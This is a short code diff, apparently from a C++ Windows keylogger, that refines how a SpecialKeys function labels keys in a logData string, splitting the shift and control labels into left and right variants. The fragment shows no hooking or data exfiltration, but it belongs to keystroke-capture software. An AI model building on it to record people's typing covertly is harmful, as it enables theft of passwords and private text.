@@ -55,10 +55,10 @@ bool SpecialKeys(int S_Key) {
         logData += "\n";
         return true;
     case VK_LSHIFT:
-        logData += "[SHIFT]";
+        logData += "[LEFT_SHIFT]";
         return true;
     case VK_RSHIFT:
-        logData += "[SHIFT]";
+        logData += "[RIGHT_SHIFT]";
         return true;
     case VK_BACK:
         logData += "[BACKSPACE]";
@@ -85,10 +85,10 @@ bool SpecialKeys(int S_Key) {
         logData += "[RIGHT_ARROW]";
         return true;
     case VK_LCONTROL:
-        logData += "[CONTROL]";
+        logData += "[LEFT_CONTROL]";
         return true;
     case VK_RCONTROL:
-        logData += "[CONTROL]";
+        logData += "[RIGHT_CONTROL]";
         return true;
     case VK_LMENU:
         logData += "[ALT]";
